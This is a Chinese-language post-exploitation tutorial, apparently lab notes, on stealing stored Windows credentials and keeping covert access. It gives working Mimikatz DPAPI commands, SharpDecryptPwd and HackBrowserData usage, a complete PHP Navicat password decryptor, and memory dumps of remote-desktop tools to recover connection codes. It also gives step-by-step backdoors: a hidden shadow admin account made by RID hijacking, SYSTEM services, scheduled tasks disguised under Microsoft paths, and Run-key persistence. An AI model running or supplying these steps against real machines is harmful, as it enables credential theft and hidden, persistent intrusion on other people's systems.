Mimikatz.exe "log" "privilege::debug" "dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D" "exit"


Mimikatz.exe "log" "privilege::debug" "dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\C1860B99FE8CC9874482F01B9EF75CC2" "exit"

Mimikatz.exe "log" "privilege::debug" "dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\E3DAF49B16DF48A0B2CEAB56984CF6E3" "exit"
```

> `dpapi::cred`：使用`dpapi`模块执行导出凭据，`DPAPI`使用**用户的登录密码生成加密密钥**，然后使用**该密钥加密数据**，确保只有当前用户才能解密数据。

![image-20241011203345644](https://image.201068.xyz/assets/38.后渗透/image-20241011203345644.png)

#### 记录guidMasterKey

> DFBE70A7E5CC19A398EBF1B96859CE5D	{cbbb106c-7c8e-4a68-99cf-e7f1316dc03c}
>
> C1860B99FE8CC9874482F01B9EF75CC2	{70e07f80-653e-4d3c-aaa4-95fdd9dc92e0}
>
> E3DAF49B16DF48A0B2CEAB56984CF6E3	{1926049a-72f7-4229-8522-2274a464c0f8}

得到的 `pbData` 就是凭据的**加密数据**，`guidMasterKey` 是该凭据的 `GUID`，**记录 guidMasterKey**。

#### 找到相关联的MasterKey

然后执行以下命令：

```python
Mimikatz.exe "log" "privilege::debug" "sekurlsa::dpapi" "exit"
```

找到与 `guidMasterKey`（`GUID`）相关联的 `MasterKey` 。

这个 MasterKey 就是**加密凭据所使用的秘钥**，记录结果中的 MasterKey 值，

![image-20241011203743010](https://image.201068.xyz/assets/38.后渗透/image-20241011203743010.png)

> ##### DFBE70A7E5CC19A398EBF1B96859CE5D
>
> {cbbb106c-7c8e-4a68-99cf-e7f1316dc03c}
>
> `aa56cdd599e0f13badec39c4c36b567bd22209544192307ffbc84ea1535d325a6d30134f85376e3d51ddf8f0d22e13736cc0f548ff3c144f82d0a7389e0e440f`
>
> ##### C1860B99FE8CC9874482F01B9EF75CC2
>
> {70e07f80-653e-4d3c-aaa4-95fdd9dc92e0}
>
> `7afd14b674703ccf4f3434522bf745cdf5d378ceafe5385fcd5002056bc2d883c01c1eacea5a6415425163fffdc97ce99891393ac6c9447f2add322a7ff6e255`
>
> ##### E3DAF49B16DF48A0B2CEAB56984CF6E3
>
> {1926049a-72f7-4229-8522-2274a464c0f8}
>
> `3aed4b50826d008047c84a1fbb7d5088caa2af6fb398620756d5612cb15550393261de1ce3b2f353e941286395db1732cf13a807017c9ba3e29de8cbe2a3aa4c`

#### 破解连接凭据

最后执行以下命令，使用找到的 `MasterKey` 值破解指定的连接凭据，得到 RDP 明文密码。

```python
Mimikatz.exe "log" "dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:aa56cdd599e0f13badec39c4c36b567bd22209544192307ffbc84ea1535d325a6d30134f85376e3d51ddf8f0d22e13736cc0f548ff3c144f82d0a7389e0e440f" "exit"

Mimikatz.exe "log" "dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\C1860B99FE8CC9874482F01B9EF75CC2 /masterkey:7afd14b674703ccf4f3434522bf745cdf5d378ceafe5385fcd5002056bc2d883c01c1eacea5a6415425163fffdc97ce99891393ac6c9447f2add322a7ff6e255" "exit"

Mimikatz.exe "log" "dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\E3DAF49B16DF48A0B2CEAB56984CF6E3 /masterkey:3aed4b50826d008047c84a1fbb7d5088caa2af6fb398620756d5612cb15550393261de1ce3b2f353e941286395db1732cf13a807017c9ba3e29de8cbe2a3aa4c" "exit"
```

![image-20241011204057828](https://image.201068.xyz/assets/38.后渗透/image-20241011204057828.png)

![image-20241011205155362](https://image.201068.xyz/assets/38.后渗透/image-20241011205155362.png)

![image-20241011205231389](https://image.201068.xyz/assets/38.后渗透/image-20241011205231389.png)

> DESKTOP-7R20O8R\administrator
>
> Admin!@#

### 2.2.获取 Xshell 保存的凭据

`Xshell`会将服务器连接信息保存在 Session 目录下的 `.xsh` 文件中，

路径如下表所示。如果用户在连接时勾选了 "**记住用户名/密码**"，该文件会保存远程服务器连接的用户名和经过加密后的密码。

| Xshell版本 | .xsh文件路径                                                 |
| ---------- | ------------------------------------------------------------ |
| Xshell 5   | `%USERPROFILE%\Documents\NetSarang\Xshell\Sessions`          |
| Xshell 6   | `%USERPROFILE%\Documents\NetSarang Computer\6\Xshell\Sessions` |
| Xshell 7   | `%USERPROFILE%\Documents\NetSarang Computer\7\Xshell\Sessions` |

Xshell 7 前的版本，我们可以直接通过 `SharpDecryptPwd` 工具进行解密，**将 SharpDecryptPwd 上传到目标主机**，执行以下命令，可以直接获取 Xshell 保存的所有连接凭据。 

####  SharpDecryptPwd 

下载地址：https://github.com/uknowsec/SharpDecryptPwd

> Navicat,TeamViewer,FileZilla,WinSCP,Xmangager

```bash
> SharpDecryptPwd.exe

Author: Uknow
Github: https://github.com/uknowsec/SharpDecryptPwd
Reference: https://rcoil.me/2019/09/SharpDecryptPwd/

Usage: SharpDecryptPwd.exe -NavicatCrypto
       SharpDecryptPwd.exe -TeamViewer
       SharpDecryptPwd.exe -FileZilla
       SharpDecryptPwd.exe -WinSCP
       SharpDecryptPwd.exe -Xmangager -p Session_Path
```

##### 获取 Xshell 保存的所有连接凭据

##### 查看Xshell 6密码

```python
SharpDecryptPwd.exe -Xmangager -p "%USERPROFILE%\Documents\NetSarang Computer\6\Xshell\Sessions"
```

![image-20241012095745213](https://image.201068.xyz/assets/38.后渗透/image-20241012095745213.png)

```bash
========== SharpDecryptPwd --> Xmangager ==========

[+] Session File:C:\Users\h\Documents\NetSarang Computer\6\Xshell\Sessions\test.xsh
  Host: 123.123.123.123
  Port: 22
  UserName: root
  Version: 6.0
  Password: g/TypnDhmBiT22bE0nB1FOfrK+CbtWigoZHlY3tbA07igPtkNwSz
  UserSid(Key): hS-1-5-21-1723628360-3837999295-140263448-1001
  Decrypt: qwe.123
```

##### 查看Xshell 7 后的版本密码

`Xshell 7` 后的版本，Session 目录不再存储用户密码，用上述方法获取的密码为**一串乱码**，只能使用**星号密码查看器直接查看密码**。

```python
SharpDecryptPwd.exe -Xmangager -p "%USERPROFILE%\Documents\NetSarang Computer\7\Xshell\Sessions"
```

![image-20241012101930758](https://image.201068.xyz/assets/38.后渗透/image-20241012101930758.png)

```BASH
========== SharpDecryptPwd --> Xmangager ==========

[+] Session File:C:\Users\h\Documents\NetSarang Computer\7\Xshell\Sessions\11111.xsh
  Host: 111.1.11.111
  Port: 22
  UserName: h
  Version: 7.0
  Password: g/TypnDhmBiT22bE0nB1FOfrK+CbtWigoZHlY3tbA07igPtkNwSz
  UserSid(Key): hS-1-5-21-1723628360-3837999295-140263448-1001
  Decrypt: qwe.123
```

##### Cobalt Strike离线运行

**攻击机**里放`SharpDecryptPwd.exe`

```python
execute-assembly scripts/SharpDecryptPwd.exe -Xmangager -p "%USERPROFILE%\Documents\NetSarang Computer\6\Xshell\Sessions"
```

#### peekPassword

**星号密码查看器** 

下载链接：https://pan.baidu.com/s/1lElpM4j9995TxewG0E0GSw 提取码：y479 

### 2.3.获取 FileZilla 保存的凭据

FileZilla 是一款快速的.可依赖的.开源的 FTP 客户端软件，具备大多数 FTP 软件功能。

#### 查看文件

FileZilla 会将所有 FTP 凭据以 **Base64 密文**的格式

保存在 `%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml` 文件中。

```python
%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml

<User>节点记录了 FTP 登录用户
<Pass>节点记录了 Base64 编码后的密码
```

![image-20241012103115114](https://image.201068.xyz/assets/38.后渗透/image-20241012103115114.png)

```xml
<?xml version="1.0" encoding="UTF-8"?>

-<FileZilla3 platform="windows" version="3.58.0">
    -<RecentServers>
    -<Server>
    	<Host>123.123.123.123</Host>
    	<Port>21</Port>
    	<Protocol>0</Protocol>
    	<Type>0</Type>
    	<User>qwe</User>
    	<Pass encoding="base64">cXdlLjEyMw==</Pass>
    	<Logontype>1</Logontype>
    	<PasvMode>MODE_DEFAULT</PasvMode>
    	<EncodingType>Auto</EncodingType>
    	<BypassProxy>0</BypassProxy>
    </Server>
    </RecentServers>
</FileZilla3>
```

将编码的 **FTP 密码解码**即可



##### FTP 密码解码

```python
cXdlLjEyMw==
```

![image-20241012103247203](https://image.201068.xyz/assets/38.后渗透/image-20241012103247203.png)

#### 导出FTP 登录凭据

也可以使用`SharpDecryptPwd`一键导出`FileZilla`保存的 FTP 登录凭据。

执行下列命令：

```python
SharpDecryptPwd.exe -FileZilla
```

![image-20241012103350049](https://image.201068.xyz/assets/38.后渗透/image-20241012103350049.png)

### 2.4.获取 NaviCat 保存的凭据

#### NaviCat

`NaviCat` 是一款强大的数据库管理和设计工具，被运维人员广泛使用。

用户**选择保存密码**后，NaviCat 会把 `IP,用户名,密码`等信息保存在注册表中，

如下图所示。

其中，密码是经过**可逆算法加密后保存**的，并且 `Navicat<=11` 版本和 `Navicat>=12` 版本分别**使用不同的加密算法**。

| 数据库类型 | 凭据存储路径                                                 |
| ---------- | ------------------------------------------------------------ |
| MySQL      | HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\<Connection Name> |
| MariaDB    | HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\MARIADBServers\<Connection Name> |
| MongoDB    | HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\<Connection Name> |
| SQL Server | HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\<Connection Name> |
| Oracle     | HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\<Connection Name> |
| PostgreSQL | HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\<Connection Name> |
| SQLite     | HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSOLite\Servers\<Connection Name> |

#### MySQL

```python
HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\test
```

![image-20241012104834724](https://image.201068.xyz/assets/38.后渗透/image-20241012104834724.png)

> 50523D3B

#### 解密脚本

上图示例中 "`Pwd`" 键的值为经过 `Navicat<=11` 版本算法加密过后的密码，

通过对其进行运算，即可得到**数据库连接的明文密码**，相关脚本百度即可。

```php
<?php

class NavicatPassword
{
    protected $version = 0;
    protected $aesKey = 'libcckeylibcckey';
    protected $aesIv = 'libcciv libcciv ';
    protected $blowString = '3DC5CA39';
    protected $blowKey = null;
    protected $blowIv = null;

    public function __construct($version = 12)
    {
        $this->version = $version;
        $this->blowKey = sha1('3DC5CA39', true);
        $this->blowIv = hex2bin('d9c7c3c8870d64bd');
    }

    public function encrypt($string)
    {
        $result = FALSE;
        switch ($this->version) {
            case 11:
                $result = $this->encryptEleven($string);
                break;
            case 12:
                $result = $this->encryptTwelve($string);
                break;
            default:
                break;
        }

        return $result;
    }

    protected function encryptEleven($string)
    {
        $round = intval(floor(strlen($string) / 8));
        $leftLength = strlen($string) % 8;
        $result = '';
        $currentVector = $this->blowIv;

        for ($i = 0; $i < $round; $i++) {
            $temp = $this->encryptBlock($this->xorBytes(substr($string, 8 * $i, 8), $currentVector));
            $currentVector = $this->xorBytes($currentVector, $temp);
            $result .= $temp;


        }

        if ($leftLength) {
            $currentVector = $this->encryptBlock($currentVector);
            $result .= $this->xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);
        }

        return strtoupper(bin2hex($result));
    }

    protected function encryptBlock($block)
    {
        return openssl_encrypt($block, 'BF-ECB', $this->blowKey, OPENSSL_RAW_DATA | OPENSSL_NO_PADDING);
    }

    protected function xorBytes($str1, $str2)
    {
        $result = '';
        for ($i = 0; $i < strlen($str1); $i++) {
            $result .= chr(ord($str1[$i]) ^ ord($str2[$i]));
        }

        return $result;
    }

    protected function encryptTwelve($string)
    {
        $result = openssl_encrypt($string, 'AES-128-CBC', $this->aesKey,
            OPENSSL_RAW_DATA, $this->aesIv);
        return strtoupper(bin2hex($result));
    }

    public function decrypt($string)
    {
        $result = FALSE;
        switch ($this->version) {
            case 11:
                $result = $this->decryptEleven($string);
                break;


            case 12:
                $result = $this->decryptTwelve($string);
                break;
            default:
                break;
        }

        return $result;
    }

    protected function decryptEleven($upperString)
    {
        $string = hex2bin(strtolower($upperString));

        $round = intval(floor(strlen($string) / 8));
        $leftLength = strlen($string) % 8;
        $result = '';
        $currentVector = $this->blowIv;

        for ($i = 0; $i < $round; $i++) {
            $encryptedBlock = substr($string, 8 * $i, 8);
            $temp = $this->xorBytes($this->decryptBlock($encryptedBlock), $currentVector);
            $currentVector = $this->xorBytes($currentVector, $encryptedBlock);
            $result .= $temp;
        }

        if ($leftLength) {
            $currentVector = $this->encryptBlock($currentVector);
            $result .= $this->xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);
        }

        return $result;
    }

    protected function decryptBlock($block)
    {
        return openssl_decrypt($block, 'BF-ECB', $this->blowKey, OPENSSL_RAW_DATA | OPENSSL_NO_PADDING);
    }

    protected function decryptTwelve($upperString)
    {
        $string = hex2bin(strtolower($upperString));
        return openssl_decrypt($string, 'AES-128-CBC', $this->aesKey, OPENSSL_RAW_DATA, $this->aesIv);
    }
}


//需要指定navacat版本两种，11或12


$navicatPassword = new NavicatPassword(11);

//解密，括号里面写入navicat加密后的密码
$decode = $navicatPassword->decrypt('50523D3B');
echo $decode . "\n";
```

![image-20241012105112175](https://image.201068.xyz/assets/38.后渗透/image-20241012105112175.png)

#### 导出数据库的登录凭据

也可以通过 `SharpDecryptPwd` 一键导出当前主机上用户连接过的**所有数据库的登录凭据**。

```python
SharpDecryptPwd.exe -NavicatCrypto
```

![image-20241012103658409](https://image.201068.xyz/assets/38.后渗透/image-20241012103658409.png)

### 2.5.获取 Winscp 保存的凭据

`WinSCP` 是一个 Windows 环境下使用的 SSH 的开源图形化 SFTP 客户端。同时支持 `SCP` 协议。

它的主要功能是**在本地与远程计算机间安全地复制文件**，并且可以**直接编辑文件**。

#### 注册表获得密文

我们可以通过以下命令**从注册表获得密文**

```python
reg query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions"

reg query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\administrator@192.168.228.195"
reg query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\Default%20Settings"
reg query "HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\root@47.93.220.111"
```

![image-20241012105605673](https://image.201068.xyz/assets/38.后渗透/image-20241012105605673.png)

```python
HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\administrator@192.168.228.195
HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\Default%20Settings
HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\root@47.93.220.111
```

![image-20241012105826412](https://image.201068.xyz/assets/38.后渗透/image-20241012105826412.png)

```python
HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\administrator@192.168.228.195
    HostName    REG_SZ    192.168.228.147
    UserName    REG_SZ    ubuntu
    FSProtocol    REG_DWORD    0x0
    LocalDirectory    REG_SZ    C:%5CUsers%5Ch%5CDocuments
    RemoteDirectory    REG_SZ    /home/ubuntu
    Password    REG_SZ    A35C474D2F886F9871A03FCC082E5F697B2CDEC3AC293E293228296D656E726D6A64726E6E64726D686B293E293228298EB0
    
HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\root@47.93.220.111
    HostName    REG_SZ    47.93.220.111
    UserName    REG_SZ    root
    FSProtocol    REG_DWORD    0x0
    Password    REG_SZ    A35C4459727BC5BDB82E333328686B72656F726E6E6C726D6D6D0D2B39726D6E6F99052330022B6C545704F80C322B2FF522
```

#### 解密

##### winscppwd.exe

gitcode：https://gitcode.com/open-source-toolkit/7397a

github：https://github.com/anoopengineer/winscppasswd

下载地址：https://github.com/anoopengineer/winscppasswd/releases/download/1.0/winscppasswd.exe

通过 `winscppwd.exe` 即可解密：

> winscppasswd.exe 查询到的用户名 查询到的IP 查询到的密文

```python
winscppasswd.exe ubuntu 192.168.228.147 A35C474D2F886F9871A03FCC082E5F697B2CDEC3AC293E293228296D656E726D6A64726E6E64726D686B293E293228298EB0

winscppasswd.exe root 47.93.220.111 A35C4459727BC5BDB82E333328686B72656F726E6E6C726D6D6D0D2B39726D6E6F99052330022B6C545704F80C322B2FF522
```

![image-20241012114015492](https://image.201068.xyz/assets/38.后渗透/image-20241012114015492.png)

![image-20241012114033810](https://image.201068.xyz/assets/38.后渗透/image-20241012114033810.png)

#### 解密`WinSCP.ini` 文件

有时候管理员会保存为 `WinSCP.ini` 文件，这时候直接查找该文件，然后使用下列命令解密即可。

```python
winscppasswd.exe ini WinSCP.ini
```

#### 导出

```python
SharpDecryptPwd.exe -WinSCP
```

![image-20241012114149659](https://image.201068.xyz/assets/38.后渗透/image-20241012114149659.png)

### 2.6.获取浏览器保存的登录凭据

Web 浏览器通常会保存网站用户名和密码等凭据，以避免多次手动输入。

通常，用户的凭据以加密格式存储在本地文件中，我们可以通过读取特定的文件，从Web浏览器中获取凭据。

#### HackBrowserData

`HackBrowserData`是一款开源工具，

可以直接从**浏览器**解密数据包括**用户登录密码，书签，Cookie，历史记录，信用卡，下载链接**等，支持流行的浏览器，

可在 Windows,macOS和Linux 平台上运行。

##### 下载地址

github：https://github.com/moonD4rk/HackBrowserData

下载链接：https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip

##### 直接运行

只需将 `HackBrowserData` 上传到目标主机，然后**直接运行**即可。

执行完毕，会在当前目录下生成一个 result 目录，

包含当前主机中已安装的所有浏览器保存的用户登录密码，浏览器书签，Cookie，历史记录等信息的CSV文件。

![image-20241012140716449](https://image.201068.xyz/assets/38.后渗透/image-20241012140716449.png)

#### **浏览器各类文件地址**

##### (1).google

```python
书签：%userprofile%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks
Cookie: %userprofile%\AppData\Local\Google\Chrome\User Data\Default\Cookies
浏览历史：%userprofile%\AppData\Local\Google\Chrome\User Data\Default\History
当前的session：%userprofile%\AppData\Local\Google\Chrome\User Data\Default\Current
Session 账号密码：%userprofile%\AppData\Local\Google\Chrome\User Data\Default\Login Data 
				%userprofile%\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data
```

##### (2).QQ浏览器

```python
⽤户数据⽬录：%userprofile%\AppData\Local\Tencent\QQBrowser\User Data\Default
缓存⽬录：%userprofile%\AppData\Local\Google\Chrome\User Data\Default\Cache\

各⽂件如下：

书签：%userprofile%\AppData\Local\Tencent\QQBrowser\UserData\Default\Bookmarks
Cookie: %userprofile%\AppData\Local\Tencent\QQBrowser\UserData\Default\Cookies
浏览历史：%userprofile%\AppData\Local\Tencent\QQBrowser\UserData\Default\History
当前的session：%userprofile%\AppData\Local\Tencent\QQBrowser\UserData\Default\CurrentSession
账号密码：%userprofile%\AppData\Local\Tencent\QQBrowser\UserData\Default\Login Data 			
		%userprofile%\AppData\Local\Tencent\QQBrowser\UserData\Default\xxxxxxxxxxx\6
```

##### (3).360浏览器

```python
账号密码⽂件：%userprofile%\AppData\Roaming\360se6\User Data\Default\apps\LoginAssis\assis2.db
```

##### (4).Firefox

```python
账号密码⽂件：
%userprofile%\AppData\Roaming\Mozilla\Firefox\Profiles\7s5izkwl.defaultrelease\logins.json
```

### 2.7.查询⽂件

#### Everything

下载链接：https://www.voidtools.com/zh-cn/downloads/

便携版：https://www.voidtools.com/Everything-1.4.1.1026.x64.zip

可使⽤`everything`查询⽂件，

下载**便携版**和**命令⾏接⼝⼯具**，上传到对⽅服务器，执⾏以下命令

```python
everything.exe -startup 		#后台启动everything
es.exe -path 路径 要查询的⽂件 		#查询具体⽂件
```

![image-20241012141548141](https://image.201068.xyz/assets/38.后渗透/image-20241012141548141.png)

### 2.8.**向⽇葵密码提取**

#### 搜索向⽇葵PID

搜索向⽇葵PID，注意要找⾮服务进程的PID

```python
tasklist /v | findstr /i sun 
```

![image-20241012141644591](https://image.201068.xyz/assets/38.后渗透/image-20241012141644591.png)

#### 导出向⽇葵的内容⽂件

使⽤ `procdump` 导出向⽇葵的内容⽂件

```python
Procdump.exe -accepteula -ma 8676
```

![image-20241012141911798](https://image.201068.xyz/assets/38.后渗透/image-20241012141911798.png)

#### 搜索

将导出的内存⽂件 使⽤ `010edtir` 打开，并执⾏下列搜索语句，搜索时使⽤ `ASCII` 码搜索，并打开使⽤正则表达式搜索功能

```python
<f f=yahei.28 c=color_edit >.{6}</f> #验证码搜索语句
<f f=yahei.28 c=color_edit >.{13}</f> #连接码搜索语句
```

### 2.9.todesk密码提取

#### 搜索 Todesk 的PID

搜索 Todesk 的PID，注意要找⾮服务进程的PID

```python
tasklist /v | findstr /i todesk
```

![image-20241012142407984](https://image.201068.xyz/assets/38.后渗透/image-20241012142407984.png)

#### 导出 Todesk 的内存⽂件

使⽤ `procdump` 导出 Todesk 的内存⽂件

```python
Procdump.exe -accepteula -ma 6508 
```

![image-20241012142450195](https://image.201068.xyz/assets/38.后渗透/image-20241012142450195.png)

#### 查看连接的验证码和机器的连接码

将导出的**内存⽂件** 使⽤ `010edtir` 打开，并搜索当天⽇期，搜索时使⽤ `ASCII 码`搜索，

搜索完毕后向上查看可找到**连接的验证码** ，

向下查看可找到**机器的连接码**

# 权限维持

## 权限维持

权限维持（Persistence，权限持久化）技术就是可以被我们用来

在系统重启.用户更改密码或其他可能造成**访问中断**的情况发生时**保持对系统的访问的技术**，

如**创建系统服务**.利用**计划任务**.**修改系统启动项**或**注册表**.**映像劫持**等。

## 1.创建影子账户

影子账户，顾名思义，就是隐藏的账户，无论通过 “计算机管理” 还是命令行查询都无法看到，只能在注册表中找到其信息。

我们常常通过创建具有管理员权限的影子账户，在目标主机上实现权限维持，不过需要拥有管理员级别的权限。

通过创建影子账户，我们可以随时随地通过**远程桌面**或**其他方法登录目标系统**，并执行管理员权限的操作。

### 创建隐藏账户

①在目标主机中输入以下命令，创建一个名为“`admin$`”的账户，“`$`” 符号表示该用户为隐藏账户创建的用户无法通过命令行查询到。

```bash
net user admin$ admin@123 /add   #创建隐藏账户admin
```

![image-20241012153222162](https://image.201068.xyz/assets/38.后渗透/image-20241012153222162.png)

#### 查看隐藏用户

但是，在 “**控制面板**” 和 **“计算机管理” 的 “本地用户和组”** 中仍然可以看到该用户

![image-20241012153645826](https://image.201068.xyz/assets/38.后渗透/image-20241012153645826.png)

![image-20241012153818049](https://image.201068.xyz/assets/38.后渗透/image-20241012153818049.png)

并且此时 `admin$` 仍然为**标准用户**，为了使其拥有管理员级别的权限，还需要**修改注册表**。

#### 命令查看隐藏用户

```python
wmic useraccount
```

![image-20241012153559806](https://image.201068.xyz/assets/38.后渗透/image-20241012153559806.png)

### 修改注册表

#### 注册表开启权限

② 在注册表编辑器中定位到 `HKEY_LOCAL_MACHINE\SAM\SAM`，

单击右键，在弹出的快捷菜单中选择“**权限**”命令，

将`Administrator`用户的权限设置为“**完全控制**”，因为该注册表项的内容在标准用户和管理员权限下都是不可见的。

```python
regedit

HKEY_LOCAL_MACHINE\SAM\SAM
```

![image-20241012153936287](https://image.201068.xyz/assets/38.后渗透/image-20241012153936287.png)

![image-20241012154026602](https://image.201068.xyz/assets/38.后渗透/image-20241012154026602.png)

![image-20241012154138780](https://image.201068.xyz/assets/38.后渗透/image-20241012154138780.png)

#### 复制F属性的值

③ 在注册表项 `HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names` 处选择 `Administrator` 用户，

在左侧找到与右边显示的**键值的类型** "`0x1f4`" 相同的目录名，复制 `000001F4` 表项下的 `F` 属性的值。

![image-20241012154211580](https://image.201068.xyz/assets/38.后渗透/image-20241012154211580.png)

![image-20241012154247196](https://image.201068.xyz/assets/38.后渗透/image-20241012154247196.png)

#### 替换F属性的值

④ 以相同的方法找到与**影藏隐藏账号** `admin$` 相应的目录 "`000003ED`" ，

将复制的 `000001F4` 表项中的 **F 属性值**粘贴到 `000003ED` 表项中的 **F 属性**处，并确定。

![image-20241012154337533](https://image.201068.xyz/assets/38.后渗透/image-20241012154337533.png)

![image-20241012154501838](https://image.201068.xyz/assets/38.后渗透/image-20241012154501838.png)

以上过程其实是 admin用户劫持了`Administrator`用户的RID，从而使admin用户获得 Administrator 用户的权限。

### 导出注册表项

⑤ 分别选中注册表项 "`admin$`" 和 "`000003ED`" 并导出

![image-20241012154530905](https://image.201068.xyz/assets/38.后渗透/image-20241012154530905.png)

![image-20241012154600056](https://image.201068.xyz/assets/38.后渗透/image-20241012154600056.png)

![image-20241012154629523](https://image.201068.xyz/assets/38.后渗透/image-20241012154629523.png)

### 删除隐藏账户

执行以下命令删除 `Hacke$` 用户

```bash
net user admin$ /del
```

提示**权限不足**，直接删除注册表两项

![image-20241012155435771](https://image.201068.xyz/assets/38.后渗透/image-20241012155435771.png)

![image-20241012155509502](https://image.201068.xyz/assets/38.后渗透/image-20241012155509502.png)

### 导入注册表

⑥ 将刚才导出的两个注册表项**导入注册表**中即可，到此，真正的影子账户 `admin$` 就创建好了。

此时无论是查看 “`本地用户和组`” 还是通过`命令行查询`都看不到该账户，只在注册表中才能看该账户的信息。

![image-20241012155601380](https://image.201068.xyz/assets/38.后渗透/image-20241012155601380.png)

![image-20241012155622486](https://image.201068.xyz/assets/38.后渗透/image-20241012155622486.png)

![image-20241012155648049](https://image.201068.xyz/assets/38.后渗透/image-20241012155648049.png)

## 2.系统服务后门

对于启动类型为 “**自动**” 的系统服务，我们可以将参考服务提权时讲的方法将**服务启动时运行的二进制文件路径设置为后门程序**，

当**系统或服务重启**时，可以重新获取对目标主机的控制权。

不过，我们需要**拥有目标主机的管理员权限**。

### 新建自启动服务

我也可以新建自启动服务来进行权限维持，

例如执行下方命令在目标主机上

创建一个名为 `houmen` 的系统服务，启动类型为“`自动`”，启动权限为 `SYSTEM`，当系统或服务重启时，

将以 SYSTEM 权限运行后门程序 `6666.exe`，目标主机将重新上线

```python
shell sc create houmen binpath= "cmd.exe /k C:\Users\h\Desktop\6666.exe" start="auto" obj= "LocalSystem"
shell sc start houmen
```

> `binpath`：指定服务的二进制文件路径，注意“`=`”后必须有一个空格
>
> `start`：指定启动类型
>
> `obj` ：指定服务运行的权限

![image-20241012155943316](https://image.201068.xyz/assets/38.后渗透/image-20241012155943316.png)

![image-20241012160336678](https://image.201068.xyz/assets/38.后渗透/image-20241012160336678.png)

## 3.计划任务后门

通过创建计划任务，让目标主机在**特定的时间点**或**规定的周期内重复运行**我们预先准备的后门程序，从而实现权限持久化。

### 创建计划任务

#### 定时运行

执行以下命令，在目标主机上创建一个名为 `houmen` 的计划任务，并在每天 `08:00` 时以 `SYSTEM` 权限运行一次后门程序6666.exe

```python
shell schtasks /Create /TN houmen /SC daily /ST 15:38 /MO 1 /TR C:\Users\h\Desktop\6666.exe /RU System /F
```

> 注意，如果以`SYSTEM`权限运行计划任务，就**需要拥有管理员级别的权限**。

![image-20241012160750951](https://image.201068.xyz/assets/38.后渗透/image-20241012160750951.png)

#### 每分钟运行

执行以下命令，创建一个名为`human`的计划任务，每`60` 秒运行一次后门程序，当计划任务触发后，目标主机将重新上线

```python
shell schtasks /Create /TN human /SC minute /MO 1 /TR C:\Users\Administrator\Desktop\6666.exe /RU System /F

#删除
shell schtasks /delete /tn human /F
```

![image-20241012160831653](https://image.201068.xyz/assets/38.后渗透/image-20241012160831653.png)

![image-20241012161010705](https://image.201068.xyz/assets/38.后渗透/image-20241012161010705.png)

#### 遵守存储规范

计划任务在 “`计划任务程序库`” 中**以类似文件目录的形式存储**，所有计划任务都存储在**最内层的目录**中。

因此，为了**增强隐蔽性**，建议在创建计划任务后门时**遵守这个存储规范**，执行以下命令：

```python
shell schtasks /create /tn "\Microsoft\Windows\AppTask\AppRun" /sc daily /st 09:00  /tr C:\Users\Administrator\Desktop\6666.exe /RU System /F
```

将在 `Microsoft\Windows\AppTask\` 路径下创建一个名为“`AppRun`”的计划任务后门

![image-20241012161052568](https://image.201068.xyz/assets/38.后渗透/image-20241012161052568.png)

## 4.启动项/注册表键后门

我们可以通过将后门程序添加到**系统启动文件夹**或通过**注册表运行键**引用来进行权限持久化。

添加的后门程序将在**用户登录**的上下文中启动，并且将具有与账户相关联的权限等级。

### 4.1.系统启动文件夹

将程序放置在启动文件夹中会导致该程序在用户登录时执行，

Windows 系统有两种常见的**启动文件夹**。

```python
#位于以下目录中的程序将在指定用户登录时启动
C:\Users\h\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

#位于以下目录中的程序将在所有用户登录时启动
C:\ProgramData\Microsoft\windows\Start Menu\Programs\Startup
```

![image-20241012161140808](https://image.201068.xyz/assets/38.后渗透/image-20241012161140808.png)

![image-20241012161202215](https://image.201068.xyz/assets/38.后渗透/image-20241012161202215.png)

### 4.2.运行键（Run Keys)

Windows系统上有许多**注册表项**可以用来设置在**系统启动或用户登录**时**运行指定的程序**或加载指定**DLL文件**，

我们可以对此类注册表进行修改，以建立持久化后门。

当用户登录时，系统会依次检查位于注册表运行键（Run Keys）中的程序，并在用户登录的时启动。

#### 系统默认运行键

Windows 系统默认创建以下运行键，如果修改 `HKEY_LOCAL_MACHINE` 下的运行键，需要拥有管理员级别的权限。

```python
#以下注册表项中的程序将在当前用户登录时启动
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\Currentversion\Runonce

#以下注册表中的程序将在所有用户登录时启动
HKEY_LOCAL_MACHINE\Software\Microsoft\windows\currentversion\Run
